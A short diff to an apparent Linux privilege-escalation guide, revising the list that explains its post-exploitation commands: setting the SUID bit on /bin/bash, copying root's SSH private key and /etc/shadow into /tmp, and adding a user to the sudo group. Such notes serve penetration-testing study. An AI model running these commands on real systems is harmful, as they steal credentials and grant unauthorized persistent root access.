@@ -13,11 +13,11 @@ cp /root/.ssh/id_rsa /tmp/id_rsa
 cp /etc/shadow /tmp/shadow
 usermod -aG sudo <username>
 ```
-1. 
-2. copy /root/.ssh/id_rsa to /tmp/id_rsa <td>
-3. copy /etc/shadow to /tmp/shadow <td>
-4. add user <username> to the **sudo** group
-
+1. Assigning the SUID bit to the `/bin/bash` file. By executing `/bin/bash -p` we execute the command with the SUID bit. <br>
+2. copy /root/.ssh/id_rsa to /tmp/id_rsa <br>
+3. copy /etc/shadow to /tmp/shadow <br>
+4. add user <username> to the **sudo** group <br>
+<br>
 # sudo -l
 
 Let's start with the simplest method I know `sudo -l`. <br>
